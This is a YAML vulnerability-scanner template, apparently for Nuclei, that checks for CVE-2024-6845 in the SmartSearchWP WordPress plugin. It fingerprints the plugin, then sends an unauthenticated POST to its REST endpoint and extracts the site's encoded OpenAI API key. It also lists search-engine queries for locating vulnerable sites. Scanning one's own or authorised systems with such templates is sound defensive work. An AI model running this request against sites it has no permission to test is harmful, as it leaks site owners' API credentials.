flow: http(1) && http(2)
http:
- matchers:
  - condition: and
    dsl:
    - contains(body,"/wp-content/plugins/smartsearchwp")
    - status_code == 200
    internal: true
    type: dsl
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
- extractors:
  - name: api-key
    part: body
    regex:
    - '"([^"]+)"'
    type: regex
  matchers:
  - condition: and
    dsl:
    - contains(content_type,"application/json")
    - status_code == 200
    type: dsl
  raw:
  - 'POST /wp-json/wdgpt/v1/api-key HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {"key": "U2FsdGVkX1+X"}

    '
id: CVE-2024-6845
info:
  author: s4e-io
  description: 'The plugin does not have proper authorization in one of its REST endpoint,
    allowing unauthenticated users to retrieve the encoded key and then decode it,
    thereby leaking the OpenAI API key.

    '
  metadata:
    fofa-query: body="/wp-content/plugins/smartsearchwp"
    framework: wordpress
    max-request: 2
    product: smartsearchwp
    publicwww-query: /wp-content/plugins/smartsearchwp
    vendor: webdigit
    verified: true
  name: SmartSearchWP < 2.4.6 - OpenAI Key Disclosure
  reference:
  - https://wpscan.com/vulnerability/cfaaa843-d89e-42d4-90d9-988293499d26/
  - https://nvd.nist.gov/vuln/detail/CVE-2024-6845
  remediation: Fixed in 2.4.6
  severity: medium
  tags: cve,cve2024,exposure,wp,wordpress,wp-plugin,smartsearchwp
